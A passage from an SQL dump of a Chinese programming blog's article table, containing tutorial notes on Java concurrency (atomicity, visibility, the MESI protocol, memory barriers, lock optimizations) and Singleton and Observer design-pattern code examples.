可见性的屏障\nmonitorenter指令后，Load屏障之后，会加一个Acquire屏障，这个屏障的作用是禁止读操作和读写操作之间发生指令重排序\nmonitorexit指令前，会加一个Release屏障，这个屏障的作用是禁止写操作和读写操作之间发生重排序\n通过 Acquire屏障和Release屏障，就可以让synchronzied保证有序性\n只有synchronized内部的指令可以重排序，绝对不会跟外部的指令发生重排序\n\n```', 0, 0, 258, 0, 0, '2020-05-19 17:01:16', '2020-05-19 17:01:16', 0, 0);
INSERT INTO `article` VALUES (77, 1, 'Java多线程-原子性', '2019/10/1570611093_mmexport1570610069620.jpg', '### 原子性问题\n![并发编程原子性问题.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624810722_并发编程-原子性问题.png)\n```java\n// 什么是原子性\n原子性:提供了互斥访问,同一时刻只能有一个线程来对它进行操作\ndata++这个必须是独立执行的，没有其他线程能影响我，一定是我自己执行成功之后，别的线程才能来进行下一次data++的执行\n\n// 原子性操作\n// Java规范规定各种变量的简单的赋值操作，规定都是原子的\n// 赋值的时候，保证没有其他线程先赋值过，没有其他线程修改过，你这个线程才能赋值\nint i = 0，resource = loadedResoures，flag = true\n// Java规范规定所有变量写操作都是原子的,包括引用类型的变量的赋值写操作，也是原子的\napps = loadedApps; // 原子的，不需要AtomicReference来处理\n\n// 大部分的简单赋值操作都是原子性的,但是有个特例\n32位虚拟机里的long/double类型的变量的简单赋值写操作，不是原子的\nlong i = 30，double c = 45.0，在32位虚拟机里就不是原子的，因为long和double是64位的\n如果多个线程同时并发的执行long i = 30，long是64位的，就会导致有的线程在修改i的高32位，有的线程在修改i的低32位，多线程并发给long类型的变量进行赋值操作，在32位的虚拟机下，是有问题的\n这样可能会导致多线程给long i = 30赋值之后，导致i的值不是30，可能是-3333344429，乱码一样的数字，就是因为高低32位赋值错了，就导致二进制数字转换为十进制之后是一个很奇怪的数字\n1、CPU对long类型计算，会把long类型放到寄存器中\n2、寄存器最大放32位，所以需要将long的二进制分成2段存放 \n3、接着多核多线程对long类型的两段二进制分别操作\n4、线程1修改long的一半二进制，修改完后放到自己的高速缓存，没刷到主存。\n5、线程2修改long的同一半二进制，此时重点【线程2并没有拿到线程1修改的那一半最新值】，线程2依然拿到了这个long的旧的一半二进制进行了写操作。 \n6、最终线程1线程2都操作long的同一半二进制，并且相互不可见时，刷到主存后就必然会导致乱码\n32jvm对long类型操作是2次完成的，首先，这种情况是出现在32位多核CPU上，如果是32位单核CPU，是不存在线程调度的，所以也不会有CPU中断这事儿，也就出现不了这种bug。 \n// 如果对变量加上了volatile，就可以保证在32位java虚拟机里面，对long/double变量的赋值写是原子的了\njava语言规范默认是volatile不保证原子性的,volatile只保证的可见性和有序性,这种特例不能说volatile是保证原子性的\n\n// 哪些操作不保证原子性\ni++; // 先读取i的值，再跟新i的值\ni = y + 2 // 先读取y的值，再更新i的值\ni = x * y // 先把x和y分别从主内存里加载到工作内存里面来，然后再从工作内存里加载出来执行计算（处理器），计算后的结果写回到工作内存里去，最后还要从工作内存里把i的最新的值刷回主内存\n\n这些复杂操作，并不是简单赋值写，他是有计算的过程在里面的，此时java语言规范默认是不保证原子性的\n\n```\n### 解决原子性问题\n#### ObjectMonitor对象\n![并发编程原子性ObjectMonitor.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624810722_并发编程-原子性-ObjectMonitor.png)\n```java\n// java对象都是分为对象头和实例变量两块的\n实例变量是平时看到的对象里的那些变量数据。\n对象头包含了两块东西\n	(1) Mark Word（包含hashCode、锁数据、GC数据，等等）\n	(2) Class Metadata Address（包含了指向类的元数据的指针）\n\n在Mark Word里就有一个指针，指向了这个对象实例关联的monitor的地址，这个monitor是c++实现的，不是java实现的。\n这个monitor实际上是c++实现的一个ObjectMonitor对象，里面包含了一个_owner指针，指向了持有锁的线程。\nObjectMonitor里还有一个entrylist，想要加锁的线程全部先进入这个entrylist等待获取机会尝试加锁，实际有机会加锁的线程，就会设置_owner指针指向自己，然后对_count计数器累加1次\n各个线程尝试竞争进行加锁，此时竞争加锁是在JDK 1.6以后优化成了基于CAS来进行加锁\nCAS加锁，操作_count计数器，比如说将_count值尝试从0变为1,如果成功了，那么加锁成功了；如果失败了，那么加锁失败了\nCAS释放锁，先是对_count计数器递减1，如果为0了就会设置_owner为null，不再指向自己，代表自己彻底释放锁\n\n```\n#### 加锁后线程进行wait\n![并发编程原子性ObjectMonitorwait与notify.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624810722_并发编程-原子性-ObjectMonitor-wait与notify.png)\n```java\n如果获取锁的线程执行wait，就会将计数器清零，同时_owner设置为null，然后自己进入一个waitset中等待唤醒\nwaitSet中的线程不参与锁竞争，而entrylist中的线程是参与锁竞争的。当waitset中的线程被notify，那么会从waitset移动到entrylist中重新参与锁竞争。\n\n```\n#### 如何保证原子性\n```java\n// java代码如何保证原子性\nsynchronized关键字可以保证原子性\n加了synchronized关键字后，有一个加锁和释放锁的机制，加锁了之后，同一段代码就只有一个线程可以执行了\nsynchronized关键字在编译以后会是monitorenter与monitorexit指令。 \n\nint a = 0;\nint b = 0;\nsynchronized(this) { // -> monitorenter 锁进入\n	// -> Load内存屏障  可见性的屏障\n	// -> Acquire内存屏障 有序性的屏障\n	int c = a; // synchronized代码块里面还是可能会发生指令重排\n	b = 1; // synchronized代码块里面还是可能会发生指令重排\n	// -> Release内存屏障 有序性的屏障\n} // -> monitorexit 锁退出\n// -> Store内存屏障 可见性的屏障\n\n```\n#### 锁优化\n```java\n从JDk 1.6开始，JVM就对synchronized锁进行了很多的优化\n（1）锁消除\n锁消除是JIT编译器对synchronized锁做的优化，在编译的时候，JIT会通过逃逸分析技术，来分析synchronized锁对象，是不是只可能被一个线程来加锁，没有其他的线程来竞争加锁，这个时候编译就不用加入monitorenter和monitorexit的指令\n仅仅一个线程争用锁的时候，就可以消除这个锁了，提升这段代码的执行的效率，因为可能就只有一个线程会来加锁，不涉及到多个线程竞争锁\n（2）锁粗化\nsynchronized(this) {\n\n}\nsynchronized(this) {\n\n}\nsynchronized(this) {\n\n}\n这个意思是JIT编译器如果发现有代码里连续多次加锁释放锁的代码，会给合并为一个锁，就是锁粗化，把一个锁给搞粗了，避免频繁多次加锁释放锁\n（3）偏向锁\n这个意思是说，monitorenter和monitorexit是要使用CAS操作加锁和释放锁的，开销较大\n因此如果发现大概率只有一个线程会主要竞争一个锁，那么会给这个锁维护一个偏好（Bias）\n后面他加锁和释放锁，基于Bias来执行，不需要通过CAS,性能会提升很多\n可能只有一个线程会来竞争一个锁，但是也有可能会有其他的线程来竞争这个锁，但是其他线程来竞争锁的概率很小\n如果有其他的线程来竞争这个锁，此时就会收回之前那个线程分配的那个Bias偏好\n偏向锁假定将来只有第一个申请锁的线程会使用锁（不会有任何线程再来申请锁），\n因此，只需要在Mark Word中CAS记录owner(本质上也是更新，但初始值为空)，如果记录成功，则偏向锁获取成功，记录锁状态为偏向锁，\n以后当前线程等于owner就可以零成本的直接获得锁；否则，说明有其他线程竞争，升级为轻量级锁\n\n（4）轻量级锁\n如果偏向锁没能成功实现，就是因为不同线程竞争锁太频繁了，此时就会尝试采用轻量级锁的方式来加锁\n对象头的Mark Word里有一个轻量级锁指针，将它尝试指向持有锁的线程，然后判断一下是不是自己加的锁\n如果是自己加的锁，那就执行代码就好了\n如果不是自己加的锁，那就是加锁失败，说明有其他人加了锁，这个时候就是升级为重量级锁\n\n（5）适应性锁（自旋锁）\n这是JIT编译器对锁做的另外一个优化，如果各个线程持有锁的时间很短，那么一个线程竞争锁不到，就会暂停，发生上下文切换，让其他线程来执行。但是其他线程很快释放锁了，然后暂停的线程再次被唤醒\n也就是说在这种情况下，线程会频繁的上下文切换，导致开销过大\n所以对这种线程持有锁时间很短的情况，是可以采取忙等策略的，也就是一个线程没竞争到锁，进入一个while循环不停等待，不会暂停不会发生线程上下文切换，等到机会获取锁就继续执行好了\n这样可以大幅度减少线程上下文的切换，而这种自旋等待获取锁的方式，就是所谓自旋锁，就是不断的自旋尝试获取锁\n如果一个线程持有锁的时间很长，那么其他线程获取不到锁，就会暂停，发生上下文切换，让其他线程来执行，这种自己暂停获取锁的方式，就是所谓的重量级锁\n根据不同情况自动调整的过程，就是适应锁的意思\n\n```', 0, 0, 73, 0, 0, '2020-05-19 16:51:39', '2020-05-19 16:51:39', 0, 0);
INSERT INTO `article` VALUES (78, 1, 'Java多线程-可见性', '2019/9/1568253974_mmexport1567598596359.jpg', '### Java内存模型\n![并发编程Java内存模型.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624793545_并发编程-Java内存模型.png)\n```java\n了解可见性前,先了解Java的内存模型\n// Java内存模型\n1. JCP定义了一种Java内存模型,以前是在JVM规范中,后来独立出来成为了JSR-133(Java内存模型和线程规范修订)\n2. 内存模型: 在特定的操作协议下,对特定的内存或高速缓存进行读写访问的过程抽象\n3. Java内存模型主要关注JVM中把变量值存储到内存和从内存取出变量值这样的底层细节\n4. 所有变量(共享的)都存储在主内存中,每个线程都有自己的工作内存,工作内存中保存该线程使用到的变量的主内存副本拷贝\n5. 线程对变量的所有操作(读、写)都应该在工作内存中完成\n6. 不同线程不能相互访问工作内存,交互数据要通过主内存\n\n// 内存间的交互操作\n// Java内存模型规定了一些操作来实现内存间交互,JVM会保证它们是原子的\n(1). lock: 锁定,把变量标识为线程独占,作用于主内存变量\n(2). unlock: 解锁,把锁定的变量释放,别的线程才能使用,作用于主内存变量\n(3). read: 读取,把变量值从主内存读取到工作内存\n(4). load: 载入,把read读取到值放入工作内存的变量中\n(5). use: 使用,把工作内存中的变量的值传递给执行引擎\n(6). assign: 赋值,把从执行引擎接收到值赋给工作内存里面的变量\n(7). store: 存储,把工作内存中一个变量的值传递到主内存中\n(8). write: 写入,把store进来的数据存放入主内存的变量中\n\n// 交互操作的规则\n1. 不允许read和load、store和write操作之一单独出现,以上两个操作必须按顺序执行,但不保证连续执行,也就是说,read与load之间、store与write之间是可插入其他指令的\n2. 不允许一个线程丢弃它的最近的assign操作,即变量在工作内存中改变了之后必须把该变化同步回主内存\n3. 不允许一个线程无原因地(没有发生过任何assign操作)把数据从线程的工作内存同步回主内存中\n4. 一个新的变量只能从主内存中\"诞生\",不允许在工作内存中直接使用一个未被初始化的变量,也就是对一个变量实施use和store操作之前,必须先执行过assign和load操作\n5. 一个变量在同一个时刻只允许一条线程对其执行lock操作,但lock操作可以被同一条线程重复执行多次,多次执行lock后,只有执行相同次数的unlock操作,变量才会被解锁\n6. 如果对一个变量执行lock操作,将会清空工作内存中此变量的值,在执行引擎使用这个变量前,需要重新执行load或assgin操作初始化变量的值\n7. 如果一个变量没有被lock操作锁定,则不允许对它执行unlock操作,也不能unlock一个被其他线程锁定的变量\n8. 对一个变量执行unlock操作之前,必须先把此变量同步回主内存(执行store和write操作)\n\n```\n### 可见性问题\n![并发编程可见性问题.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624793545_并发编程-可见性问题.png)\n```java\n可见性: 一个线程对主内存的修改可以及时的被其他线程观察到\n\n// 步骤\n1. 共享变量data在主内存当中\n2. 线程A和线程B都对data进行了一个副本拷贝\n3. 线程A将自己对应的工作内存的data改为了1\n4. 线程A将data写入主内存当中\n5. 线程B一直在读取自己工作内存中的data数值,不知道线程A将data改变了而且写入主内存了\n\n// 导致共享变量在线程间不可见的原因(官方定义)\n1. 线程交叉执行\n2. 重排序结合线程交叉执行\n3. 共享变量更新后的值没有在工作内存与主内存之间及时更新\n\n```\n#### 从硬件的级别来考虑一下可见性的问题\n![并发编程可见性问题硬件角度.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624798426_并发编程-可见性问题-硬件角度.png)\n```java\n// 从硬件的级别来考虑一下可见性的问题\n1. 每个处理器都有自己的寄存器，所以多个处理器各自运行一个线程的时候\n2. 可能导致某个变量给放到寄存器里去，接着就会导致各个线程没法看到其他处理器寄存器里的变量的值修改了\n\n可见性的第一个问题: 在寄存器的级别就有可能导致变量副本的更新，无法让其他处理器看到\n可见性的第二个问题: 一个处理器运行的线程对变量的写操作都是针对写缓冲的,并不是直接更新主内存，\n	所以很可能导致一个线程更新了变量，但是仅仅是在写缓冲区里罢了，没有更新到主内存里去,\n	此时其他处理器的线程是没法读到他的写缓冲区的变量值的，所以此时就是会有可见性的问题\n\n即使一个处理器的线程更新了写缓冲区之后，将更新同步到了自己的高速缓存里或者是主内存里，\n然后还把这个更新通知给了其他的处理器，但是其他处理器可能就是把这个更新放到无效队列里去，没有更新他的高速缓存,\n此时其他处理器的线程从高速缓存里读数据的时候，读到的还是过时的旧值\n\n```\n### 如何解决可见性问题\n![并发编程可见性问题flush与refresh.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624800093_并发编程-可见性问题-flush与refresh.png)\n```java\n// MESI协议\n1. 如果要实现可见性的话，有一个方法是通过MESI协议，这个MESI协议实际上有很多种不同的实现，\n2. 因为他不过就是一个协议罢了，具体的实现机制要靠具体底层的系统如何实现\n3. 根据具体底层硬件的不同，MESI协议的实现是有区别的 \nMESI协议有一种实现，一个处理器将另外一个处理器的高速缓存中的更新后的数据拿到自己的高速缓存中来更新一下，这样大家的缓存就实现同步了，然后各个处理器的线程看到的数据就一样了\n4. MESI四个字母实际上指的是数据在高速缓存中的四种状态,上图没有画出,只是个大致的简略图\n\n为了实现MESI协议，有两个配套的专业机制\n(1) flush处理器缓存\n	flush处理器缓存，意思是把自己更新的值立刻刷新到高速缓存或者是主内存里(根据底层实现不同)\n	因为必须立刻要刷到高速缓存或者是主内存里，才有可能在后续通过一些特殊的机制让其他的处理器从自己的高速缓存或者是主内存里读取到更新的值\n	除了flush以外，他还会发送一个消息到总线（bus），通知其他处理器，某个变量的值被他给修改了\n(2) refresh处理器缓存\n	refresh处理器缓存，意思是处理器中的线程在读取一个变量的值的时候\n	如果嗅探发现其他处理器的线程更新了变量的值，必须立刻从其他处理器的高速缓存或者是主内存里，读取这个最新的值更新到自己的高速缓存中\n	\n所以说为了保证可见性，在底层可以是通过MESI协议、flush处理器缓存和refresh处理器缓存，这一整套机制来保障的\n记住flush和refresh这两个操作\nflush是强制刷新数据到高速缓存或主内存，不要仅仅停留在写缓冲器里面\nrefresh是从总线嗅探发现某个变量被修改，必须强制从其他处理器的高速缓存或者主内存里加载变量的最新值到自己的高速缓存里去\n\n// Java代码保证可见性\n使用volatile关键字或使用synchronized关键字可以保证可见性  \nvolatile和synchronized都会通过底层MESI协议机制以及加入一些内存屏障保证可见性\n\n按照可见性来划分的话，内存屏障可以分为Load屏障和Store屏障。\nLoad屏障的作用是执行refresh处理器缓存的操作，就是对别的处理器更新过的变量，从其他处理器的高速缓存或者主内存加载数据到自己的高速缓存来，确保自己看到的是最新的数据。\nStore屏障的作用是执行flush处理器缓存的操作，就是把自己当前处理器更新的变量的值，都刷新到高速缓存或者主内存里去\n\n// volatile\nvolatile boolean isRunning = true;\n// -----线程1：\n// -> Release屏障 有序性的屏障\nisRunning = false;\n// -> Store屏障 可见性的屏障\n\n// -----线程2:\n// -> Load屏障 可见性的屏障\nwhile(isRunning) {\n// -> Acquire屏障 有序性的屏障\n// 代码逻辑...\n}\nvolatile变量写操作的前面会加入一个Release屏障，之后会加入一个Store屏障，这样就可以保证volatile写跟Release屏障之前的任何读写操作都不会指令重排，然后Store屏障保证了，写完数据之后，立马会执行flush处理器缓存的操作\nvolatile变量读操作的前面会加入一个Load屏障，这样就可以保证对这个变量的读取时，如果被别的处理器修改过了，必须得从其他处理器的高速缓存或者主内存中加载到自己本地高速缓存里，保证读到的是最新数据；在之后会加入一个Acquire屏障，禁止volatile读操作之后的任何读写操作会跟volatile读指令重排序\n\n// synchronized\nint a = 0;\nint b = 0;\nsynchronized(this) { // -> monitorenter 锁进入\n    // -> Load内存屏障  可见性的屏障\n    // -> Acquire内存屏障 有序性的屏障\n    int c = a; // synchronized代码块里面还是可能会发生指令重排\n    b = 1; // synchronized代码块里面还是可能会发生指令重排\n    // -> Release内存屏障 有序性的屏障\n} // -> monitorexit 锁退出\n// -> Store内存屏障 可见性的屏障\n在monitorenter指令之后会加一个Load屏障，执行refresh处理器缓存的操作，把别的处理器修改过的最新值加载到自己高速缓存里来\n在monitorexit指令之后会加一个Store屏障，让线程把自己在同步代码块里修改的变量的值都执行flush处理器缓存的操作，刷到高速缓存或者主内存里去\n\n```', 0, 0, 134, 0, 0, '2020-05-21 17:08:15', '2020-05-21 17:08:15', 0, 0);
INSERT INTO `article` VALUES (79, 1, 'MESI协议基本原理', '2018/9/1536380675_591435116c5c27ddb5a1e3c9d085085f.jpg', '### 高速缓存的结构\n![并发编程高速缓存结构.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624854671_并发编程-高速缓存结构.png)\n```java\n// 处理器高速缓存的底层数据结构实际是一个拉链散列表的结构\n多个bucket，每个bucket挂很多的cache entry\n每个cache entry由三个部分组成：\n	(1) tag: 指向这个缓存在主内存中的数据的地址\n	(2) cache line: 缓存的数据,内部可以包含多个变量的值\n	(3) flag: 缓存行的状态\n\n// 读写高速缓存时,定位变量\n处理器在读写高速缓存的时候，实际上会根据变量名执行一个内存地址解码的操作,解析出来3个东西\n	(1)index: 用于定位到拉链散列表中的某个bucket\n	(2)tag: 用于定位cache entry\n	(3)offset: 用于定位一个变量在cache line中的位置\n\n如果可以成功定位到一个高速缓存中的数据，而且flag还标志着有效，则缓存命中，不满足上述条件，就是缓存未命中\n如果是读数据未命中的话，会从主内存重新加载数据到高速缓存中，现在处理器一般都有三级高速缓存，L1、L2、L3，越靠前面的缓存读写速度越快\n\n```\n### MESI协议\n```java\n// MESI协议\n因为有高速缓存的存在，所以就导致各个处理器可能对一个变量会在自己的高速缓存里有自己的副本\n这样一个处理器修改了变量值，别的处理器是看不到的，所以就是为了这个问题引入了缓存一致性协议\n\nMESI协议规定：\n对一个共享变量的读操作可以是多个处理器并发执行的\n但是如果是对一个共享变量的写操作，只有一个处理器可以执行，其实也会通过排他锁的机制保证就一个处理器能写\n\n// 缓存数据的状态\ncache entry的flag代表了缓存数据的状态，MESI协议中划分为：\n（1）invalid：无效的，标记为I，当前cache entry无效，里面的数据不能使用\n（2）shared：共享的，标记为S，当前cache entry有效，而且里面的数据在各个处理器中都有各自的副本，但是这些副本的值跟主内存的值是一样的，各个处理器就是并发的在读而已\n（3）exclusive：独占的，标记为E，当前处理器对这个数据独占了，只有他可以有这个副本，其他的处理器都不能包含这个副本\n（4）modified：修改过的，标记为M，只能有一个处理器对共享数据更新，所以只有更新数据的处理器的cache entry才是exclusive状态，表明当前线程更新了这个数据，这个副本的数据跟主内存是不一样的\n\nMESI协议规定了一组消息，各个处理器在操作内存数据的时候，都会往总线发送消息\n而且各个处理器还会不停的从总线嗅探最新的消息，通过这个总线的消息传递来保证各个处理器的协作\n\n// 状态切换\n处理器0读取某个变量的数据时，首先会根据index、tag和offset从高速缓存的拉链散列表读取数据\n如果发现状态为I，也就是无效的，此时就会发送read消息到总线\n接着主内存会返回对应的数据给处理器0，处理器0就会把数据放到高速缓存里，同时cache entry的flag状态是S\n在处理器0对一个数据进行更新的时候，如果数据状态是S，则此时就需要发送一个invalidate消息到总线，尝试让其他的处理器的高速缓存的cache entry全部变为I，以获得数据的独占锁\n其他的处理器1会从总线嗅探到invalidate消息，此时就会把自己的cache entry设置为I，也就是过期掉自己本地的缓存，然后就是返回invalidate ack消息到总线，传递回处理器0，处理器0必须收到所有处理器返回的ack消息\n处理器0收到所有处理器返回的ack消息后,接着处理器0就会将cache entry先设置为E，独占这条数据，在独占期间，别的处理器就不能修改数据了，因为别的处理器此时发出invalidate消息，这个处理器0是不会返回invalidate ack消息的，除非他先修改完再说\n接着处理器0修改这条数据，修改完后将cache entry设置为M，也有可能是把数据此时强制写回到主内存中，具体看底层硬件实现\n然后其他处理器此时这条数据的状态都是I了，那如果要读的话，全部都需要重新发送read消息，从主内存或者是其他处理器来加载，具体怎么实现要看底层的硬件\n当处理器1修改数据时,处理器0会嗅探到invalidate消息，此时就会把自己的cache entry从M设置为I，也就是过期掉自己本地的缓存，然后就是返回invalidate ack消息到总线，传递回处理器0\n这套机制其实就是缓存一致性在硬件缓存模型下的完整的执行原理\n\n```\n#### I切换S\n![并发编程MESI原理I切换S.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624855915_并发编程-MESI原理-I切换S.png)\n#### S切换E\n![并发编程MESI原理S切换E.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624855915_并发编程-MESI原理-S切换E.png)\n#### E切换M\n![并发编程MESI原理E切换M.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624863898_并发编程-MESI原理-E切换M.png)\n#### M切换I\n![并发编程MESI原理M切换I.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624863898_并发编程-MESI原理-M切换I.png)\n### 写缓冲器和无效队列优化MESI协议\n![并发编程MESI原理写缓冲器与无效队列.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624855915_并发编程-MESI原理-写缓冲器与无效队列.png)\n```java\nMESI协议如果每次写数据的时候都要发送invalidate消息等待所有处理器返回ack\n然后获取独占锁后才能写数据，那可能就会导致性能很差了，因为这个对共享变量的写操作，实际上在硬件级别变成串行的了\n\n所以为了解决这个问题，硬件层面引入了写缓冲器和无效队列\n\n// 写缓冲器的作用是\n一个处理器写数据的时候，直接把数据写入缓冲器，同时发送invalidate消息\n然后就认为写操作完成了，可以干别的事儿了，不会阻塞在这里。\n这个处理器如果之后收到其他处理器的ack消息之后,才会把写缓冲器中的写结果拿出来，通过对cache entry设置为E加独占锁，同时修改数据，然后设置为M\n其实写缓冲器的作用就是让处理器写数据的时候直接写入缓冲器，不需要同步阻塞等待其他处理器的invalidate ack返回，这就大大提升了硬件层面的执行效率了\n包括查询数据的时候，会先从写缓冲器里查，因为有可能刚修改的值在这里，然后才会从高速缓存里查，这个就是存储转发\n\n// 无效队列的作用是\n其他处理器在接收到了invalidate消息之后，不需要立马过期本地缓存，直接把消息放入无效队列，就返回ack给那个写处理器了\n然后每过段时间从无效队列里取出来消息，过期本地缓存即可,这就进一步加速了性能\n\n通过引入写缓冲器和无效队列\n一个处理器要写数据的话，他直接写数据到写缓冲器，发送一个validate消息出去，就立马返回，执行别的操作了；\n其他处理器收到invalidate消息之后直接放入无效队列，立马就返回invalidate ack\n\n```\n#### 写缓冲器和无效队列引发的可见性和有序性问题\n```java\n// 可见性和有序性的问题\n// 可见性\n写数据不一定立马写入自己的高速缓存或者主内存，是因为可能写入了写缓冲器；\n读数据不一定立马从别人的高速缓存或者主内存刷新最新的值过来，invalidate消息在无效队列里面\n写入写缓冲器之后，没刷入高速缓存，导致别人读不到；\n读数据的时候，可能invalidate消息在无效队列里，导致没法立马感知到过期的缓存，没立马加载最新的数据\n\n// 有序性:\n（1）StoreLoad重排序\n// 共享变量\nint a;\n// 线程1\na = 1;\nint b = a;\n第一个是Store，第二个是Load\n但是可能处理器对store操作先写入了写缓冲器，此时这个写操作相当于没执行，然后就执行了第二行代码，第二行代码的b是局部变量，这个操作等于是读取a的值，是load操作\n第一个store操作写到写缓冲器里去了，线程1自己可以在自己的写缓冲器读到\n但导致其他处理器线程此时是读不到的，好像是第一个写操作没执行一样，第二个读操作却先执行了\nStoreLoad重排，本来应该Store先执行Load后执行,但是变成了Load先执行Store后执行\n\n（2）StoreStore重排序\ninstance = loadNewInstance();\nloaded = true;\n两个写操作，但是可能第一个写操作写入了写缓冲器\n然后第二个写操作是直接修改的高速缓存，这个时候就导致了两个写操作顺序颠倒了\n诸如此类的重排序，都可能会因为写缓冲器的机制发生\n\n```\n#### 解决可见性和有序性问题\n```java\n// 解决可见性问题：Store屏障 + Load屏障\n如果加了Store屏障之后，就会强制性要求你对一个写操作必须阻塞等待到其他的处理器返回invalidate ack之后，对数据加锁\n修改数据到高速缓存中，必须在写数据之后，强制执行flush操作\nflush操作的效果是要求一个写操作必须刷到高速缓存或者主内存，不能停留在写缓冲里\n\n如果加了Load屏障之后，在从高速缓存中读取数据的时候，如果发现无效队列里有一个invalidate消息\n此时会立马强制根据那个invalidate消息把自己本地高速缓存的数据，设置为I（过期），然后就可以强制从其他处理器的高速缓存中加载最新的值了,这是refresh操作\n\n// 解决有序性问题: Acquire屏障 + Release屏障\nAcquire屏障，Release屏障，但是都是由基础的StoreStore屏障,StoreLoad屏障组成而来，可以避免指令重排序的效果\nStoreStore屏障，会强制让写数据的操作全部按照顺序写入写缓冲器里，他不会让你第一个写到写缓冲器里去，第二个写直接修改高速缓存了\ninstance = loadNewInstance();\n// -> StoreStore屏障\nloaded = true;\n\nStoreLoad屏障，他会强制先将写缓冲器里的数据写入高速缓存中，接着读数据的时候强制清空无效队列，对里面的validate消息全部过期掉高速缓存中的条目，然后强制从主内存里重新加载数据\na = 1; // 强制要求必须直接写入高速缓存，不能停留在写缓冲器里，清空写缓冲器里的这条数据\n```', 0, 0, 343, 0, 0, '2020-05-22 12:24:39', '2020-05-22 12:24:39', 0, 0);
INSERT INTO `article` VALUES (80, 1, 'Singleton-多线程设计模式', '2019/10/1570286217_mmexport1570282106733.jpg', '### 单例设计模式\n```java\n// 单例设计模式Singleton\n单例设计模式是最基础的设计模式\n它保证只有一个实例,而不是多个实例\n\n// Java单例设计模式的五种实现\n(1) 传统饿汉式\n(2) 传统懒汉式\n(3) 双检测锁加volatile\n(4) 静态内部类\n(5) 枚举\n\n```\n### 代码示例\n#### 传统饿汉式\n```java\npublic class SingletonObject1 {\n    /**\n     * can\'t lazy load\n     */\n    private static final SingletonObject1 instance = new SingletonObject1();\n    private SingletonObject1() {\n        // empty\n    }\n    public static SingletonObject1 getInstance() {\n        return instance;\n    }\n}\n\n实现起来很简单,但无法懒加载\n```\n\n#### 传统懒汉式\n```java\npublic class SingletonObject2 {\n\n    private static SingletonObject2 instance;\n\n    private SingletonObject2() {\n        // empty\n    }\n\n    // 性能差\n    public synchronized static SingletonObject2 getInstance() {\n        if (null == instance) {\n            instance = new SingletonObject2();\n        }\n        return SingletonObject2.instance;\n    }\n}\n\n实现起来较简单,需要注意的是需要保证原子性加锁避免多线程问题,但因为加锁导致性能差\n```\n\n#### 双检测锁加volatile\n```java\npublic class SingletonObject3 {\n    // volatile 必加,否则因为jvm优化产生空指针\n    private volatile static SingletonObject3 instance;\n\n    private SingletonObject3() {\n        // empty\n    }\n\n    // double check add volatile\n    public static SingletonObject3 getInstance() {\n        if (null == instance) {\n            synchronized (SingletonObject3.class) {\n                if (null == instance) {\n                    instance = new SingletonObject3();\n                }\n            }\n        }\n        return SingletonObject3.instance;\n    }\n}\n\n较传统懒汉式而言,没有把锁放在方法上,这样只有第一次创建时需要经过加锁,其他则不需要加锁,性能好\n需要注意的是synchronized前后需要两次判断来防止线程问题,这也就是双检测\n需要注意的是锁对象需要加volatile来保证可见性与可序性,否则实例对象可能未创建就被使用了,从而导致空指针异常\n\n// 可见性\n由于本地内存与主存的数据并不会实时同步\nvolatile可以保证不同线程间的可见性;强制对缓存的修改操作立刻写入主存\nvolatile依靠cpu提供的高速缓存一致性协议(cesi)或数据总线锁进行实现\n\n// 可序性\n// 正常逻辑认为执行顺序\n1. momery = allocate() // 分配对象内存空间\n2. ctorInstantce() // 初始化对象\n3. instance = momery // 设置instance指向刚刚分配的内存\n\n// 通过JVM和CPU优化,发生了指令重排序\n1. momery = allocate() // 分配对象内存空间\n2. instance = momery // 设置instance指向刚刚分配的内存\n3. ctorInstantce() // 初始化对象\n处理器为提高运算速度可能做出违背代码原有顺序的优化,比如JVM中的重排序\nvolatile利用内存屏障禁止了JVM的重排序优化,防止重排序导致的问题\n\n```\n#### 静态内部类\n```java\npublic class SingletonObject4 {\n\n    private SingletonObject4() {\n        // empty\n    }\n\n    private static class InstanceHolder {\n        private final static SingletonObject4 instance = new SingletonObject4();\n    }\n\n    public static SingletonObject4 getInstance() {\n        return InstanceHolder.instance;\n    }\n}\n\n这是一种最常见的单例写法,很简便且实用,推荐\n由于静态只会初始化一次,这个特性可以有效的运用在单例模式上\n```\n\n\n#### 枚举\n```java\npublic class SingletonObject5 {\n\n    private SingletonObject5() {\n\n    }\n\n    private enum Singleton {\n        INSTANCE;\n\n        private final SingletonObject5 instance;\n\n        Singleton() {\n            instance = new SingletonObject5();\n        }\n\n        public SingletonObject5 getInstance() {\n            return instance;\n        }\n    }\n\n    public static SingletonObject5 getInstance() {\n        return Singleton.INSTANCE.getInstance();\n    }\n\n    public static void main(String[] args) {\n        IntStream.rangeClosed(1, 100).forEach(i -> new Thread(String.valueOf(i)){\n            @Override\n            public void run() {\n                System.out.println(SingletonObject5.getInstance());\n            }\n        }.start());\n    }\n}\n\n这是一种不为常见的写法,运用了枚举实现,在书籍上很受推荐\n由于枚举只会实例化一次,这个特性可以有效的运用在单例模式上\n```', 0, 0, 38, 0, 0, '2020-06-17 22:37:06', '2020-06-17 22:37:06', 0, 0);
INSERT INTO `article` VALUES (81, 1, 'Observer-多线程设计模式', '2019/10/1570287495_mmexport1570281766963.jpg', '### 观察者设计模式\n```java\n// 观察者设计模式Observer\n(1) 这是一种非常常见且基础的设计模式\n(2) 当一个通知接收到时,通知调用单体或群体的方法\n\n```\n### 代码示例\n#### 图示\n![多线程设计模式Observer.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626698804_多线程设计模式-Observer.png)\n#### 观察者监听接口LifeCycleListener\n```java\npublic interface LifeCycleListener {\n\n    void onEvent(ObserverRunnable.RunnableEvent event);\n}\n```\n#### 线程状态管理及执行器ObserverRunnable\n```java\npublic class ObserverRunnable implements Runnable {\n\n    protected LifeCycleListener listener;\n\n    protected String queryId;\n\n    public ObserverRunnable(LifeCycleListener listener, String queryId) {\n        this.listener = listener;\n        this.queryId = queryId;\n    }\n\n    protected void notifyChange(final 